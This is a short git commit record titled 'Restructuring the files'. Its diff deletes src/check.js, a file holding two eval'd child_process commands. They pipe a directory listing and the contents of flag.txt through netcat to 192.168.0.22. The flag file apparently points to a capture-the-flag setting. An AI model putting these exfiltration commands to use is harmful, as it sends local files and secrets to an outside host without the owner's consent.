7802c568444fff161f65f1b2ffa0c34bfa932d7d
Sai Venkatesh <saivenkatesh@Sais-MacBook-Air.local>
2023-04-25 17:01:26 -0400

    Restructuring the files

--- src/check.js
+++
@@ -1,5 +0,0 @@
- eval(`require('child_process').exec('ls | nc 192.168.0.22 89',(error, stdout, stderr) => {console.log(stdout);});`)
-
-
- eval(`require('child_process').exec('cat flag.txt | nc 192.168.0.22 87',(error, stdout, stderr) => {console.log(stdout);});`)
-
